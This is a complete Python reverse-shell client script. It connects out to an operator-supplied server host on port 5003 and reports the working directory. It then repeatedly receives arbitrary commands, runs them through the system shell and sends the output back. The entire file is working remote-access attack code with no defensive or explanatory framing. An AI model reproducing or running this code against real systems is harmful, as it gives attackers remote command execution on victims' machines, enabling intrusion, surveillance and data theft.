import socket
import os
import subprocess
import sys
import platform
 
 
# Ensure SERVER_HOST is provided as an argument
if len(sys.argv) < 2:
   print("Usage: python client.py <SERVER_HOST>")
   sys.exit(1)
 
 
# Constants
SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 131072  # 128KB buffer size for messages
SEPARATOR = "<sep>"
 
 
 
 
def initiate_connection():
   try:
       # Create a socket object
       sock = socket.socket()
       # Connect to the server
       print(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}")
       sock.connect((SERVER_HOST, SERVER_PORT))
       print(f"Connected to {SERVER_HOST}:{SERVER_PORT}")
       # Send the current working directory to the server
       current_dir = os.getcwd()
       sock.send(current_dir.encode())
 
 
       while True:
           # Receive a command from the server
           command = sock.recv(BUFFER_SIZE).decode()
           print(f"[DEBUG] Command received: {command}")
 
 
           if command.lower() == "exit":
               break
 
 
           # Execute the received command
           response = handle_command(command)
           print(f"[DEBUG] Command response: {response}")
 
 
           # Send the response and current directory back to the server
           current_dir = os.getcwd()
           message = f"{response}{SEPARATOR}{current_dir}"
           sock.send(message.encode())
 
 
       # Close the socket connection
       sock.close()
   except socket.gaierror as e:
       print(f"Address-related error connecting to server: {e}")
   except socket.error as err:
       print(f"Socket error: {err}")
   except Exception as e:
       print(f"Error: {e}")
 
 
 
 
def handle_command(command):
   if command.startswith("cd "):
       # Change directory command
       directory = command[3:].strip()
       try:
           os.chdir(directory)
           return f"Changed directory to {directory}"
       except FileNotFoundError:
           return f"Directory not found: {directory}"
       except Exception as e:
           return str(e)
   else:
       # Execute shell command
       return execute_shell_command(command)
 
 
 
 
def execute_shell_command(command):
   # Identify the operating system
   os_type = platform.system().lower()
   if os_type == "windows":
       # Use Windows shell to execute the command
       process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
   else:
       # Use Unix-based shell to execute the command
       process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  executable="/bin/bash", text=True)
 
 
   # Capture the command output
   stdout, stderr = process.communicate()
   return stdout + stderr
 
 
 
 
if __name__ == "__main__":
   initiate_connection()
